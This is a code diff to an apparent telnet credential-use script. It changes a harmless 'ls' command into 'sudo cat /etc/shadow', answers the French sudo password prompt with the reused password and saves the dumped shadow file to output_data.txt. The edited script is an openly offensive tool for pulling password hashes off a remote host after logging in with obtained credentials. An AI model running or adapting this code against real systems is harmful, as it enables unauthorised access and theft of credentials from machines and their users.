@@ -72,12 +72,14 @@ def use_telnet_credentials(login, password):
         tn.write(str_login.encode('ascii') + b"\n")
         tn.read_until(b"Password: ",2)
         tn.write(str_password.encode('ascii') + b"\n")
-        tn.write(b"ls\n")
+        tn.write(b"sudo cat /etc/shadow\n")
+        tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ",2)
+        tn.write(str_password.encode('ascii') + b"\n")
         tn.write(b"exit\n")
         read_data = tn.read_all()
         with open('output_data.txt', 'w') as output:
             output.write(str(read_data))
-        print("[*] Ending Telnet Session: Check output_data.txt")
+        print("[*] Ending Telnet Session: Check output_data.txt For Shadow File Content")
         sys.exit(1)
     except:
         print("telnet connection with remote server couldn't be established")
